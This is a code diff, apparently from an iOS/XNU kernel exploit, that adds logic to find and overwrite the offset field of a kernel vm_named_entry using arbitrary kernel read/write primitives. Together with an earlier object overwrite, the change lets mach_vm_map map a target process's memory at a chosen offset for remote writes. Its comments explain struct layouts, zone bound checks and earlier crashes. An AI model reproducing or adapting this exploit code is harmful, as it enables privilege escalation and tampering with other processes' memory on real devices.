@@ -40,6 +40,18 @@
 // ctx bit-fields), so the field ends exactly at 0x40.
 #define VME_BLOCK_HI 0x20u
 
+// The one 32-byte block of struct vm_named_entry we can write, and the only
+// one that holds .offset. struct vm_named_entry is
+//   lck_mtx_t Lock; union{vm_map_t map; vm_map_copy_t copy;} backing;
+//   vm_object_offset_t offset; vm_object_size_t size; vm_object_offset_t
+//   data_offset; unsigned access:8, protection:4, is_object:1, internal:1,
+//   is_sub_map:1, is_copy:1, is_fully_owned:1;
+// = 0x38 bytes on xnu-10063 (Lock is 16 B, backing at 0x10 -- the device
+// confirms 0x10 in 7/7 samples because that is where backing.copy reads back
+// as a live vm_map_copy). So [0x00,0x20) is strictly inside the element and a
+// 32-byte store there cannot trip the zone bound check.
+#define VNE_BLOCK_BYTES 0x20u
+
 extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
 extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t addr, mach_vm_size_t size);
 extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
@@ -469,12 +481,105 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
               check == newOD ? @"MATCH" : @"MISMATCH");
     }
 
+    // ---------------------------------------------------------------------
+    // NAMED-ENTRY OFFSET -- the half of the hijack that was missing.
+    //
+    // For a memory entry, XNU does NOT take the vm_object offset from the
+    // copy's .offset and does NOT take it from the entry's vme_offset. It
+    // takes it from vm_named_entry.offset. osfmk/vm/vm_map.c, the named-entry
+    // path of mach_vm_map:
+    //
+    //   4262  if (named_entry->size < (offset + initial_size))
+    //             return KERN_INVALID_ARGUMENT;   // caller's offset ONLY
+    //   4285  offset = offset + named_entry->offset;
+    //   4760  object = vm_named_entry_to_vm_object(named_entry);
+    //          -> VME_OBJECT(vm_map_copy_first_entry(named_entry->backing.copy))
+    //   ...   vm_map_enter(target_map, &map_addr, map_size, mask, flags,
+    //                      object, offset, ...)
+    //
+    // So the memory entry resolves to exactly two hijacked values:
+    //   the object  = VME_OBJECT(copy_entry)      (the write above)
+    //   the offset  = named_entry->offset + our file_offset
+    //
+    // The object half has been landing and MATCHing since 03ac21b5, and the
+    // target still could not see a single byte: with offset pinned at 0 every
+    // mapping landed on byte 0 of the target's vm_object, so remote_write
+    // scribbled on the head of the heap and strlen() on an untouched page
+    // returned 0. wantOff in the DIAG above was non-zero on almost every call
+    // (0x1808000, 0x1854000, 0x1870000, 0xbf44000, 0x97c000) which is the
+    // direct evidence: that value is the offset that was needed and was lost.
+    //
+    // Located by value, not hardcoded. mach_make_memory_entry_64() built this
+    // entry with offset = 0, so .size is the one 8-byte field equal to the
+    // copy's .size and .offset is the word right before it. That way the run
+    // proves the layout in its own log, and if the layout is not what we
+    // think the write is skipped instead of landing somewhere guessed.
+    //
+    // vme_offset at entry+0x40 is still NOT written and cannot be:
+    // sizeof(struct vm_map_entry) is 0x50, every writer here is fixed at 32
+    // bytes (early_kwrite32bytes is one setsockopt of EARLY_KRW_LENGTH), and
+    // 0x40 + 0x20 = 0x60 > 0x50 would panic on the zone bound check exactly
+    // like 9b540f48 did. It does not need to be written -- 4285 shows XNU
+    // never reads it on this path.
+    // ---------------------------------------------------------------------
+    {
+        enum { NE_DUMP_BYTES = 0x30 };
+
+        static const char *hexdigNE = "0123456789abcdef";
+        uint8_t ne[NE_DUMP_BYTES];
+        kreadbuf(shmemNamedEntry, ne, sizeof(ne));
+        char neHex[NE_DUMP_BYTES * 2 + 1];
+        for (uint32_t i = 0; i < (uint32_t)NE_DUMP_BYTES; i++) {
+            neHex[i * 2]     = hexdigNE[(ne[i] >> 4) & 0xF];
+            neHex[i * 2 + 1] = hexdigNE[ne[i] & 0xF];
+        }
+        neHex[NE_DUMP_BYTES * 2] = '\0';
+
+        // vm_map_copy.size, written by vm_named_entry_associate_vm_object().
+        const uint64_t copySize = kread64(shmemVMCopyAddr + 0x10);
+
+        // 8-byte-aligned fields of vm_named_entry in [0x10, 0x28] are, in
+        // order, backing / offset / size / data_offset for the xnu-10063
+        // layout. backing is a live kernel pointer, offset and data_offset are
+        // 0, size is the copy's size: exactly one match.
+        const uint32_t NE_NONE = 0xFFFFFFFFu;
+        uint32_t sizeAt = NE_NONE;
+        for (uint32_t off = 0x10; off <= 0x28; off += 8) {
+            uint64_t v = 0;
+            memcpy(&v, ne + off, sizeof(v));
+            if (v == copySize) { sizeAt = off; break; }
+        }
+        const uint32_t offAt = (sizeAt == NE_NONE) ? NE_NONE : (sizeAt - 8);
+
+        NSLog(@"[DS] DIAG namedentry ne=0x%llx raw=%s copySize=0x%llx sizeAt=0x%x offsetAt=0x%x",
+              (unsigned long long)shmemNamedEntry, neHex,
+              (unsigned long long)copySize,
+              (unsigned)sizeAt, (unsigned)offAt);
+
+        if (offAt != NE_NONE && offAt + sizeof(uint64_t) <= VNE_BLOCK_BYTES) {
+            uint8_t blk[EARLY_KRW_LENGTH];
+            kreadbuf(shmemNamedEntry, blk, sizeof(blk));
+
+            const uint64_t newOffset = pageObjectOffset;
+            memcpy(blk + offAt, &newOffset, sizeof(newOffset));
+
+            early_kwrite32bytes(shmemNamedEntry, blk);
+
+            uint64_t check = 0;
+            kreadbuf(shmemNamedEntry + offAt, &check, sizeof(check));
+            NSLog(@"[DS] DIAG wrote named_entry.offset@0x%x -> 0x%llx, readback 0x%llx %@",
+                  (unsigned)offAt, (unsigned long long)newOffset,
+                  (unsigned long long)check,
+                  check == newOffset ? @"MATCH" : @"MISMATCH");
+        } else {
+            NSLog(@"[DS] DIAG SKIP named_entry.offset: located at 0x%x, not inside "
+                  @"the writable 32-byte block [0x00,0x%x)", (unsigned)offAt,
+                  (unsigned)VNE_BLOCK_BYTES);
+        }
+    }
+
     // No unlock here: g_vmRemapLock is owned by vm_create_shmem_with_object(),
     // which releases it once we return.
-
-    // vme_offset deliberately NOT written. pageObjectOffset stays logged by the
-    // DIAG above so the next run tells us whether it is non-zero, instead of
-    // us guessing its unit again.
 
     mach_vm_address_t mappedAddr = 0;
     vm_prot_t curProt = VM_PROT_ALL | VM_PROT_IS_MASK;
